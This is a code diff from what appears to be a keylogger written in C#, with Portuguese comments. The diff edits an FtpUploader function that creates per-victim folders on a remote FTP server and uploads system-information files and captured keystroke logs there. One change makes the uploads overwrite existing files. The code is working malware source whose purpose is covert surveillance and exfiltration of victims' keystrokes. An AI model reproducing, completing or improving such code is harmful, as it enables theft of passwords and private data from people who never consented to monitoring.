@@ -81,7 +81,7 @@ namespace keylogger {
             }
         }
 
-        public static bool FtpUploader(string ftpServer, int ftpPort, string ftpUsername, string ftpPassword, string filepathForUpload, string userFolderFtp, bool uploadType) {
+        public static bool FtpUploader(string ftpServer, int ftpPort, string ftpUsername, string ftpPassword, string filepathForUpload, string userFolderFtp, ushort uploadType) {
             //Verificando se há conexão à internet
             if(CheckInternetConnection()) {
                 //Caso a internet caia no meio do processo, tratamos as exceções
@@ -109,9 +109,9 @@ namespace keylogger {
                                 client.CreateDirectory("/htdocs/loggers/" + userFolderFtp + "/syslog", true);
                             }
                             //Fazendo o upload do arquivo do arquivo de informações do sistema para a sua pasta
-                            client.UploadFile(filepathForUpload, ftpFilepathTarget, FtpRemoteExists.Skip, false, FtpVerify.Retry);
+                            client.UploadFile(filepathForUpload, ftpFilepathTarget, FtpRemoteExists.Overwrite, false, FtpVerify.Retry);
                         }
-                        //Caso o tipo de upload for o log das teclas quando o pc é desligado
+                        //Caso o tipo de upload for o log das teclas
                         else if(uploadType == KeyboardListener.logUpload) {
                             string nameOfLastItem = string.Empty; //Guarda o nome do último arquivo da pasta da vítima atual
                             bool isFolderEmpty = true; //Guarda se a pasta está vazia
